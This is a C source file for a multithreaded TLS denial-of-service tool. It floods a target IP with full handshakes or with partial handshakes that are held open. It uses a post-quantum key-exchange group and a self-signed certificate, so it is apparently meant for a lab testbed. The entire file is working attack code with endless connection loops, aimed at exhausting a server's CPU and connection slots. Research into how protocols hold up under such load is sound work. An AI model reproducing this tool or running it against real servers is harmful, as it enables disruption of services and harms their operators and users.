#include "SETUP.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pthread.h>
#include <string.h>





SSL_CTX *ctx;

typedef struct {
    char target_ip[64];
    int mode; // 1 = full handshake, 2 = partial
} thread_args;

/* ========================== */
/* VERIFY CERTIFICATE */
/* ========================== */
int verify_certificate(SSL *ssl)
{
    long result = SSL_get_verify_result(ssl);

    if (result != X509_V_OK) {
        printf("[!] Certificate verification failed: %ld\n", result);
        return 0;
    }

    X509 *cert = SSL_get_peer_certificate(ssl);
    if (!cert) {
        printf("[!] No certificate presented by server\n");
        return 0;
    }

    printf("[+] Certificate verified successfully\n");

    X509_free(cert);
    return 1;
}

/* ========================== */
/* ATTACK THREAD */
/* ========================== */
void* attack_thread(void* arg)
{
    thread_args *targs = (thread_args*)arg;

    while (1)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            usleep(100000);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        if (inet_pton(AF_INET, targs->target_ip, &addr.sin_addr) != 1) {
            fprintf(stderr, "[!] Invalid target IP: %s\n", targs->target_ip);
            close(sock);
            return NULL;
        }

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("connect");
            close(sock);
            usleep(100000);
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        if (!ssl) {
            ERR_print_errors_fp(stderr);
            close(sock);
            usleep(100000);
            continue;
        }

        SSL_set_fd(ssl, sock);

        printf("[*] Starting attack thread with mode %d\n", targs->mode);

        if (targs->mode == 1)
        {
            /* FULL HANDSHAKE FLOOD WITH VERIFICATION */
            if (SSL_connect(ssl) <= 0)
            {
                printf("[!] Handshake failed\n");
                ERR_print_errors_fp(stderr);
            }
            else
            {
                printf("[+] Handshake success\n");

                /* VERIFY CERTIFICATE */
                if (!verify_certificate(ssl)) {
                    printf("[!] Invalid certificate\n");
                }
            }
        }
        else if (targs->mode == 2)
        {
            /* PARTIAL HANDSHAKE (no verification possible) */
            SSL_set_connect_state(ssl);
            SSL_do_handshake(ssl);

            sleep(100);
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
    }
}

/* ========================== */
/* MAIN */
/* ========================== */
int main(int argc, char **argv)
{
    if (argc < 4)
    {
        printf("Usage: %s <threads> <mode> <target_ip>\n", argv[0]);
        printf("mode: 1=handshake flood, 2=partial\n");
        return 1;
    }

    int threads = atoi(argv[1]);
    int mode = atoi(argv[2]);
    char *target_ip = argv[3];

    SSL_library_init();
    SSL_load_error_strings();

    ctx = SSL_CTX_new(TLS_client_method());

    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    /* ========================== */
    /* PQC GROUP */
    /* ========================== */
    if (SSL_CTX_set1_groups_list(ctx, HANDSHAKE_ALGO) != 1) {
        printf("[!] Failed to set PQC group\n");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    /* ========================== */
    /* CERTIFICATE VERIFICATION SETUP */
    /* ========================== */

    /* Load trusted certificate (self-signed server cert) */
    if (SSL_CTX_load_verify_locations(ctx, CERT_FILE, NULL) != 1)
    {
        printf("[!] Failed to load %s\n", CERT_FILE);
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    /* Enforce verification */
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);

    /* ========================== */
    /* THREADS */
    /* ========================== */

    pthread_t t[threads];

    thread_args args;
    snprintf(args.target_ip, sizeof(args.target_ip), "%s", target_ip);
    args.mode = mode;

    for (int i = 0; i < threads; i++)
        pthread_create(&t[i], NULL, attack_thread, &args);

    for (int i = 0; i < threads; i++)
        pthread_join(t[i], NULL);

    SSL_CTX_free(ctx);
    return 0;
}
